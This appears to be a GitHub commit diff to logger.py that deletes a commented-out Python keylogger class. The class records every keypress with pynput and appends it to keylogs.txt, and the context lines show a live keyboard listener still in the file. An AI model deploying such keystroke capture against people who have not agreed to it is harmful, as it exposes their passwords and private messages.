5168922288fb68865319ac21c03d48bcc5ab1dff
Ronnie Atuhaire <66623378+Ronlin1@users.noreply.github.com>
2022-04-19 23:44:44 +0300

    Update logger.py

--- logger.py
+++ logger.py
@@ -10,34 +10,3 @@ def on_press(key):
  
 with Listener(on_press=on_press) as listener :
     listener.join()
-
-# from pynput import keyboard
-
-
-# class KeyLogger():
-#     def __init__(self, filename: str = "keylogs.txt") -> None:
-#         self.filename = filename
-
-#     @staticmethod
-#     def get_char(key):
-#         try:
-#             return key.char
-#         except AttributeError:
-#             return str(key)
-
-#     def on_press(self, key):
-#         print(key)
-#         with open(self.filename, 'a') as logs:
-#             logs.write(self.get_char(key))
-
-#     def main(self):
-#         listener = keyboard.Listener(
-#             on_press=self.on_press,
-#         )
-#         listener.start()
-
-
-# if __name__ == '__main__':
-#     logger = KeyLogger()
-#     logger.main()
-#     input()
